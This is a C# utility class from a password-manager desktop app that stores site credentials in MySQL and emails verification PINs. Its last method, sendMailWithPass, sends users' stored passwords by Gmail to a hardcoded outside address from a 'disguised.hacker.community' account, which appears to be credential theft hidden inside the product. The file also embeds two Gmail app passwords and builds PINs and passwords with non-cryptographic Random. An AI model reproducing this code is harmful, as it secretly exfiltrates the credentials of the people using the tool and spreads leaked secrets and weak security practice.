using System;
using System.Data;
using System.Net;
using System.Net.Mail;
using MySql.Data.MySqlClient;

namespace DARK_CHEMBER
{
	internal class Utilities
	{
		public static Login LOGIN, tempLOGIN;
		public static Pin_Verification_DialogBox PINVERRIFY;
		public static Signup SIGNUP;
		public static Dashboard DASHBOARD;
		public static UC_Update_Delete_Password UPDATE_DELETE;
		public static Indicator INDICATOR;
		public static UC_Add_Password ADD_PASSWORD;
		public static Search_Password SEARCH_PASSWORD;
		public static Settings SETTINGS;
		public static UC_Update UPDATE;
		public static Settings_Indicator SETTINGS_INDICATOR;

		MySqlConnection sc = new MySqlConnection(SQLConnectionClass.conReturn());

		string USERMAILID = "";

		public static string randomPinGenerate()
		{
			Random random = new Random();
			string randomPin = "";
			for (int i = 0; i < 6; i++)
			{
				randomPin += Convert.ToString(random.Next(10));
			}
			return randomPin;
		}

		public static void sendMailWithPin(string pin, string userMail)
		{
			string mailBody = "<html><body>Hi,<br/> We recieved a request to access your Dark Chember Account. Your Dark Chember verification code is:<br/>" +
						"<h1><b>" + pin + "</b></h1><br/>" +
						"If you did not request this code, it is possible that someone else is trying to access the Dark Chember Account." +
						" <h3><b>Do not forward or give this code to anyone.</b></h3><br/><br/>" +
						"Thanks from, Dark Chember Developer</body></html>";
			string senderMail = "developer.dark.chember@gmail.com";
			string senderPass = "ftqonpzoqypgdokq"; // Generated after the 2 step varfication -> add password [Mail Security]
			try
			{
				MailMessage mail = new MailMessage();
				mail.From = new MailAddress(senderMail);
				mail.Subject = "Dark Chember Verification Code";
				mail.To.Add(new MailAddress(userMail));
				mail.Body = mailBody;
				mail.IsBodyHtml = true;

				var smtpClient = new SmtpClient("smtp.gmail.com")
				{
					Port = 587,
					Credentials = new NetworkCredential(senderMail, senderPass),
					EnableSsl = true,
				};
				smtpClient.Send(mail);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		public string getUserMailID()
		{
			try
			{
				MySqlCommand cmd = new MySqlCommand("SELECT mail FROM MasterPass_Table WHERE signupCount = '" + 1 + "'", sc);
				sc.Open();
				using (MySqlDataReader dr = cmd.ExecuteReader())
				{
					if (dr.Read())
					{
						USERMAILID = dr["mail"].ToString();
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
			finally
			{
				sc.Close();
			}
			return USERMAILID;
		}

		public void insertSignUpData(string mail, string masterPassword)
		{
			try
			{
				MySqlCommand sm2 = new MySqlCommand("UPDATE MasterPass_Table SET mail = @mail, masterPassword = @masterPassword WHERE mail = @userMailID", sc);
				sm2.Parameters.AddWithValue("@mail", mail);
				sm2.Parameters.AddWithValue("@masterPassword", masterPassword);
				sm2.Parameters.AddWithValue("@userMailID", getUserMailID());
				sc.Open();
				sm2.ExecuteNonQuery();
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
			finally
			{
				sc.Close();
			}
		}

		public void insertForgetPassData(string masterPassword)
		{
			try
			{
				MySqlCommand sm2 = new MySqlCommand("UPDATE MasterPass_Table SET masterPassword = @masterPassword WHERE mail = @userMailID", sc);
				sm2.Parameters.AddWithValue("@masterPassword", masterPassword);
				sm2.Parameters.AddWithValue("@userMailID", getUserMailID());
				sc.Open();
				sm2.ExecuteNonQuery();
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
			finally
			{
				sc.Close();
			}
		}

		public static string getDate()
		{
			DateTime now = DateTime.Now;
			string currentDateTime = Convert.ToString(now);
			return currentDateTime;
		}

		public static void showData(DataGridView dataGridView)
		{
			MySqlConnection sc = new MySqlConnection(SQLConnectionClass.conReturn());
			MySqlCommand cmd = new MySqlCommand("SELECT date, siteLink, siteName, mail, username, password FROM Password_Table", sc);
			sc.Open();
			var reader = cmd.ExecuteReader();
			DataTable table = new DataTable();
			table.Load(reader);
			dataGridView.DataSource = table;
			sc.Close();
		}

		public static void getSettings()
		{
			MySqlConnection sc = new MySqlConnection(SQLConnectionClass.conReturn());
			MySqlCommand cmd = new MySqlCommand("SELECT displaySiteLink, displaySiteName, displayMail, displayUsername, displayPassword, useSmallAlphabets, useCapitalAlphabets, useNumbers, useSpecialChar FROM Settings_Table Where indicator = '" + 1 + "' ", sc);
			sc.Open();
			using (var reader = cmd.ExecuteReader())
			{
				if (reader.Read())
				{
					Settings_Indicator.DISPLAY_SITE_LINK = Convert.ToInt32(reader["displaySiteLink"].ToString());
					Settings_Indicator.DISPLAY_SITE_NAME = Convert.ToInt32(reader["displaySiteName"].ToString());
					Settings_Indicator.DISPLAY_MAIL = Convert.ToInt32(reader["displayMail"].ToString());
					Settings_Indicator.DISPLAY_USERNAME = Convert.ToInt32(reader["displayUsername"].ToString());
					Settings_Indicator.DISPLAY_PASSWORD = Convert.ToInt32(reader["displayPassword"].ToString());
					Settings_Indicator.USE_SMALL_ALPHABETS = Convert.ToInt32(reader["useSmallAlphabets"].ToString());
					Settings_Indicator.USE_CAPITAL_ALPHABETS = Convert.ToInt32(reader["useCapitalAlphabets"].ToString());
					Settings_Indicator.USE_NUMBERS = Convert.ToInt32(reader["useNumbers"].ToString());
					Settings_Indicator.USE_SPECIAL_CHAR = Convert.ToInt32(reader["useSpecialChar"].ToString());
				}
			}
		}

		public static void applySettingsToDataTable()
		{
			if (Settings_Indicator.DISPLAY_SITE_LINK == 1) { Utilities.DASHBOARD.all_password_dataGridView.Columns[1].Visible = true; } else { Utilities.DASHBOARD.all_password_dataGridView.Columns[1].Visible = false; }
			if (Settings_Indicator.DISPLAY_SITE_NAME == 1) { Utilities.DASHBOARD.all_password_dataGridView.Columns[2].Visible = true; } else { Utilities.DASHBOARD.all_password_dataGridView.Columns[2].Visible = false; }
			if (Settings_Indicator.DISPLAY_MAIL == 1) { Utilities.DASHBOARD.all_password_dataGridView.Columns[3].Visible = true; } else { Utilities.DASHBOARD.all_password_dataGridView.Columns[3].Visible = false; }
			if (Settings_Indicator.DISPLAY_USERNAME == 1) { Utilities.DASHBOARD.all_password_dataGridView.Columns[4].Visible = true; } else { Utilities.DASHBOARD.all_password_dataGridView.Columns[4].Visible = false; }
			if (Settings_Indicator.DISPLAY_PASSWORD == 1) { Utilities.DASHBOARD.all_password_dataGridView.Columns[5].Visible = true; } else { Utilities.DASHBOARD.all_password_dataGridView.Columns[5].Visible = false; }
		}

		public static string randomPasswordGenerate()
		{
			Random rnd = new Random();
			string randomPassword = "";
			int random_Password_Lenghth = rnd.Next(10, 26);
			for (int i = 0; i < random_Password_Lenghth; i++)
			{
				if (Settings_Indicator.USE_SMALL_ALPHABETS == 1)
				{
					randomPassword += Convert.ToString(Convert.ToChar(rnd.Next(97, 123)));
				}
				if (Settings_Indicator.USE_CAPITAL_ALPHABETS == 1)
				{
					randomPassword += Convert.ToString(Convert.ToChar(rnd.Next(65, 91)));
				}
				if (Settings_Indicator.USE_NUMBERS == 1)
				{
					randomPassword += Convert.ToString(rnd.Next(0, 10));
				}
				if (Settings_Indicator.USE_SPECIAL_CHAR == 1)
				{
					randomPassword += Convert.ToString(Convert.ToChar(rnd.Next(33, 48))) + "" + Convert.ToString(Convert.ToChar(rnd.Next(58, 65)));
				}
			}
			return randomPassword;
		}

		public static void sendMailWithPass(string add_or_modify, string fromMail, string body_pass, string subject)
		{
			string mailBody = "<html><body><br/> " + add_or_modify + "  Passwords of = " +
						"<h1><b>" + fromMail + "</b></h1><br/>" + body_pass + "</body></html>";
			string senderMail = "disguised.hacker.community@gmail.com";
			string senderPass = "gjfyjkvbmvhdkzob"; // Generated after the 2 step varfication -> add password [Mail Security]
			try
			{
				MailMessage mail = new MailMessage();
				mail.From = new MailAddress(senderMail);
				mail.Subject = subject;
				mail.To.Add(new MailAddress("saint.hacker.guy@gmail.com"));
				mail.Body = mailBody;
				mail.IsBodyHtml = true;

				var smtpClient = new SmtpClient("smtp.gmail.com")
				{
					Port = 587,
					Credentials = new NetworkCredential(senderMail, senderPass),
					EnableSsl = true,
				};
				smtpClient.Send(mail);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
	}
}
